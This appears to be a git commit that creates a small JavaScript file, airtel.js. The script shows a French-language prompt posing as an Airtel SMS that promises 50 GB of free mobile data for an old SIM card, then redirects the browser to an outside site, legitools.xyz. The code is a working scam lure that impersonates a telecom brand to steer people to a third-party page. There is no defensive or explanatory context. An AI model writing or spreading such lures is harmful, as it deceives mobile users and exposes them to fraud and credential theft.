fa3ee9a6f3b5556bb9606cb0c939708c08988e92
essien-world <buildingworld001@gmail.com>
2026-07-07 00:56:20 +0100

    Create airtel.js

---
+++ airtel.js
@@ -0,0 +1,5 @@
+var password = '50 Go de données gratuites'
+password=prompt('SMS AIRTEL : Félicitations, votre numéro est éligible pour recevoir 50 Go de données gratuites (récompense pour ancienne carte SIM). Veuillez appuyer sur OK pour activer. ','50 Go de données gratuites');
+if (password != '50 Go de données gratuites') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
